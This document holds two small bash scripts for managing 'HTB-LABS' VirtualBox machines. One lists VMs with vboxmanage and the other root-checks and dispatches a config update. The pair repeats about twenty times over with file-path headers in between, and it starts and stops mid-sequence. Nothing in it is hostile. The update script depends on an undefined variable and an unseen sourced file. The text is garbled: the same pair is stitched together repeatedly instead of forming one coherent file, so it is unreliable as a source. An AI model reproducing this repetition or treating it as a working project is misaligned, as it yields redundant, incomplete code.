### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh